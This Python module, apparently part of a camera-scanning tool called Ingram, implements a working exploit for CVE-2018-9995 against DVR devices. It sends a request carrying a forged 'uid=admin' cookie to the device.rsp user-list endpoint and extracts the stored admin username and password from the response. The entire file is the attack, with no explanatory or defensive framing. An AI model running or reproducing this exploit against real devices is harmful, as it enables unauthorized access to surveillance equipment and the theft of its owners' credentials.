"""DVR device user&pwd disclosure"""
import requests

from Ingram.utils import config
from Ingram.utils import logger


def cve_2018_9995(ip: str) -> list:
    headers = {
        'Connection': 'close',
        'User-Agent': config.USERAGENT,
        'Cookie': 'uid=admin',
    }
    url = f"http://{ip}/device.rsp?opt=user&cmd=list"

    try:
        r = requests.get(url, timeout=config.TIMEOUT, verify=False, headers=headers, allow_redirects=False)
        if r.status_code == 200:
            lst = r.json()['list'][0]
            name, passwd = lst['uid'], lst['pwd']

            return [True, name, passwd, 'cve-2018-9995']
    except Exception as e:
        logger.error(e)
    return [False, ]